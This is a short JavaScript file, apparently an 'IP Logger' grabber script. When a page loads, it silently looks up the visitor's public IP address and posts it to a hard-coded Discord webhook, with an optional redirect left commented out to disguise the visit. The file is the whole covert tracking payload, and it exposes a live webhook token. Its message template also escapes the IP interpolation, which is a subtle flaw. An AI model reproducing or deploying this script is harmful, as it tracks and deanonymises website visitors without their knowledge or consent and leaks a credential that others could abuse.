async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'N/A';
    }
}

async function sendToWebhook(ip) {
    const webhookUrl = 'https://discord.com/api/webhooks/1444881923909619712/rrsDVZbrvQxBYnNPrsWP2wLBpAOxZxvi4QTwDIoJyof_bZWP-TrO_so9z0ehii2qSIUP';
    const payload = {
        content: `New user IP: \${ip}`,
        username: 'IP Logger',
        avatar_url: 'https://i.imgur.com/4M34hi2.png'
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            console.error('Webhook response error:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending to webhook:', error);
    }
}

window.onload = async () => {
    const ip = await getIP();
    await sendToWebhook(ip);
    
    // Optional: Redirect to another site after sending the IP
    // window.location.href = 'https://google.com';
};
